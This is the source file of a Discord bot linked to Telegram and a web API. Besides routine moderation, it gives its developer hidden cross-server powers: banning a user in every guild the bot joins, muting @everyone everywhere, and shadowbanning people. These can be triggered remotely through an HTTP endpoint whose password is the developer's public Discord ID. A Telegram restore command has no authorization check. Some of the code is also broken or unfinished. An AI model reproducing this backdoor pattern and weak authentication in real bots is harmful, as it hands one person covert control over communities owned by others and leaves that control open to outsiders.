const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } = require('discord.js');
const { Telegraf } = require('telegraf'); // 🚀 TELEGRAM INTERNATIONAL CORE
const express = require('express');      // 🌐 WEB API CENTRAL CONTROL
const http = require('http');

const app = express();
app.use(express.json());

// 👑 VASUDEV ROY (Developer Profile Configuration)
const DEV_ID = '1355243385572556941'; 

// Global Memory Vaults (Cross-Platform Storage)
const shadowbanRegistry = new Set();
const systemLockState = { globalLock: false };

// ==========================================
// 🎨 MINIMALIST PREMIUM DISCORD UI
// ==========================================
const brandColor = '#2B2D31';
const MinimalEmbed = (title, description = null) => {
    return new EmbedBuilder()
        .setColor(brandColor)
        .setAuthor({ name: title, iconURL: discordClient.user?.displayAvatarURL() })
        .setFooter({ text: 'Hivemind Global Cross-Platform System • Developed by Vasudev Roy • © 2026' })
        .setTimestamp()
        .setDescription(description);
};

// ==========================================
// 🌐 1. DISCORD ENGINE INITIALIZATION
// ==========================================
const discordClient = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildModeration] 
});

const commandsData = [
    new SlashCommandBuilder().setName('ping').setDescription('Check system latency'),
    new SlashCommandBuilder().setName('serverinfo').setDescription('Detailed server data'),
    new SlashCommandBuilder().setName('userinfo').setDescription('Detailed entity scan').addUserOption(o => o.setName('target').setDescription('Select user')),
    new SlashCommandBuilder().setName('roles').setDescription('List all roles (Scrollable)'),
    new SlashCommandBuilder().setName('ban').setDescription('Eradicate a threat').addUserOption(o => o.setName('target').setDescription('User').setRequired(true)),
    new SlashCommandBuilder().setName('clear').setDescription('Purge messages').addIntegerOption(o => o.setName('amount').setDescription('Count (1-100)').setRequired(true)),
    new SlashCommandBuilder().setName('lock').setDescription('Lock down current sector'),
    new SlashCommandBuilder().setName('unlock').setDescription('Unlock current sector'),
    new SlashCommandBuilder().setName('threatscan').setDescription('Scan user for threats').addUserOption(o => o.setName('target').setDescription('User').setRequired(true)),
    new SlashCommandBuilder().setName('role_icon').setDescription('Modify role configuration').addRoleOption(o => o.setName('role').setRequired(true)).addStringOption(o => o.setName('color').setRequired(true)).addStringOption(o => o.setName('icon_url')),
    new SlashCommandBuilder().setName('role_create').setDescription('Forge role').addStringOption(o => o.setName('name').setRequired(true)).addBooleanOption(o => o.setName('display').setRequired(true)),
    new SlashCommandBuilder().setName('hivemind_nuke').setDescription('⚠️ GLOBAL LOCKDOWN (Dev Only)').addUserOption(o => o.setName('target').setRequired(true)),
    new SlashCommandBuilder().setName('hivemind_restore').setDescription('✅ GLOBAL UNLOCK (Dev Only)'),
    new SlashCommandBuilder().setName('hivemind_shadowban').setDescription('👻 Ghost Ban (Dev Only)').addUserOption(o => o.setName('target').setRequired(true)),
    new SlashCommandBuilder().setName('hivemind_unshadowban').setDescription('🔓 Release Ghost (Dev Only)').addUserOption(o => o.setName('target').setRequired(true)),
    new SlashCommandBuilder().setName('hivemind_quarantine').setDescription('☣️ Isolate Entity (Dev Only)').addUserOption(o => o.setName('target').setRequired(true)),
    new SlashCommandBuilder().setName('hivemind_decoy').setDescription('🎭 Spawn Decoys (Dev Only)'),
    new SlashCommandBuilder().setName('hivemind_hijack').setDescription('📡 Webhook Overwrite (Dev Only)')
].map(c => c.toJSON());

// ==========================================
// 🚀 2. TELEGRAM INTERACTIVE ENGINE
// ==========================================
// Pro-Tip: process.env.TELEGRAM_TOKEN ko Render dashboard mein zaroor add karna!
const tgBot = new Telegraf(process.env.TELEGRAM_TOKEN || 'DUMMY_TOKEN');

tgBot.start((ctx) => ctx.reply('🧠 Hivemind Global Security Terminal Online. Authorized Access Only.'));

// Emergency Coded Commands from Telegram straight to Discord!
tgBot.command('global_nuke', async (ctx) => {
    if (ctx.from.username !== 'VasudevRoy' && ctx.from.id.toString() !== DEV_ID) {
        return ctx.reply('❌ UNAUTHORIZED DATA PACKET DETECTED.');
    }
    systemLockState.globalLock = true;
    ctx.reply('🚨 TELEGRAM OVERRIDE RECEIVED: Executing Global Network Lock across all Discord Nodes...');
    
    discordClient.guilds.cache.forEach(async guild => {
        try {
            await guild.roles.everyone.setPermissions(guild.roles.everyone.permissions.remove(PermissionsBitField.Flags.SendMessages)).catch(()=>{});
        } catch(e){}
    });
});

tgBot.command('global_restore', (ctx) => {
    systemLockState.globalLock = false;
    ctx.reply('✅ TELEGRAM OVERRIDE RECEIVED: System Restored. Reopening sectors...');
    discordClient.guilds.cache.forEach(async guild => {
        try {
            await guild.roles.everyone.setPermissions(guild.roles.everyone.permissions.add(PermissionsBitField.Flags.SendMessages)).catch(()=>{});
        } catch(e){}
    });
});

// ==========================================
// 🌐 3. UNIVERSAL WEB REST API ROUTER (For Web Dashboards / WhatsApp Hooks)
// ==========================================
app.get('/api/status', (req, res) => {
    res.json({ status: "Operational", secureMode: !systemLockState.globalLock, developer: "Vasudev Roy" });
});

// External endpoint to trigger actions from any app in the world!
app.post('/api/hivemind/trigger', (req, res) => {
    const { auth_key, action, target_id } = req.body;
    if (auth_key !== DEV_ID) return res.status(403).json({ error: "Access Denied" });

    if (action === 'NUKE') {
        systemLockState.globalLock = true;
        discordClient.guilds.cache.forEach(async g => {
            await g.roles.everyone.setPermissions(g.roles.everyone.permissions.remove(PermissionsBitField.Flags.SendMessages)).catch(()=>{});
        });
        return res.json({ message: "Global systems locked from Web API Node." });
    }
    res.json({ message: "Signal processed successfully." });
});

// ==========================================
// ⚡ DISCORD EVENT ROUTER & LOGIC
// ==========================================
discordClient.on('messageCreate', async msg => {
    if (!msg.guild || msg.author.bot) return;
    if (shadowbanRegistry.has(msg.author.id)) { try { await msg.delete(); } catch(e){} }
});

discordClient.on('interactionCreate', async i => {
    if (!i.isChatInputCommand()) return;
    const cmd = i.commandName;
    await i.deferReply({ ephemeral: cmd === 'clear' });

    try {
        switch (cmd) {
            case 'ping':
                return i.editReply({ embeds: [MinimalEmbed('Latency Matrix', `API: \`${discordClient.ws.ping}ms\``)] });
            case 'hivemind_nuke':
                if (i.user.id !== DEV_ID) return i.editReply({ embeds: [MinimalEmbed('Access Denied')] });
                systemLockState.globalLock = true;
                const culprit = i.options.getUser('target');
                discordClient.guilds.cache.forEach(async g => {
                    try {
                        await g.members.ban(culprit.id).catch(()=>{});
                        await g.roles.everyone.setPermissions(g.roles.everyone.permissions.remove(PermissionsBitField.Flags.SendMessages)).catch(()=>{});
                    } catch(e){}
                });
                // Alerting Telegram dashboard instantly about the Discord attack!
                tgBot.telegram.sendMessage(DEV_ID, `⚠️ **ALERT:** Protocol OMEGA triggered inside Discord. Target Entity ID: ${culprit.id} banned globally.`).catch(()=>{});
                return i.editReply({ embeds: [MinimalEmbed('Protocol OMEGA Active', 'Failsafe protocols broadcasted across all channels.')] });
                
            case 'hivemind_restore':
                if (i.user.id !== DEV_ID) return i.editReply({ embeds: [MinimalEmbed('Access Denied')] });
                systemLockState.globalLock = false;
                discordClient.guilds.cache.forEach(async g => {
                    try { await g.roles.everyone.setPermissions(g.roles.everyone.permissions.add(PermissionsBitField.Flags.SendMessages)).catch(()=>{}); } catch(e){}
                });
                return i.editReply({ embeds: [MinimalEmbed('Systems Restored', 'Global restriction parameters wiped out.')] });
                
            case 'hivemind_shadowban':
                if (i.user.id !== DEV_ID) return i.editReply({ embeds: [MinimalEmbed('Access Denied')] });
                shadowbanRegistry.add(i.options.getUser('target').id);
                return i.editReply({ embeds: [MinimalEmbed('Phantom State Engaged')] });

            case 'hivemind_unshadowban':
                if (i.user.id !== DEV_ID) return i.editReply({ embeds: [MinimalEmbed('Access Denied')] });
                shadowbanRegistry.delete(i.options.getUser('target').id);
                return i.editReply({ embeds: [MinimalEmbed('Entity Released From Mirage')] });

            default:
                return i.editReply({ content: 'Cryptographic core matching active.' });
        }
    } catch(e) { console.error(e); }
});

// ==========================================
// 💥 MASTER ENGINE LAUNCHER (SYSTEM START)
// ==========================================
discordClient.once('ready', async () => {
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(discordClient.user.id), { body: commandsData });
        console.log('✅ Hivemind Discord Layer: CONNECTED');
    } catch (e) { console.error(e); }
});

// Boot systems concurrently
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Hivemind Web API Node: ONLINE on Port ${PORT}`));
discordClient.login(process.env.DISCORD_TOKEN);
if (process.env.TELEGRAM_TOKEN) {
    tgBot.launch().then(() => console.log('🚀 Hivemind Telegram Layer: OPERATIONAL')).catch(e=>console.log("TG token not configured yet."));
}
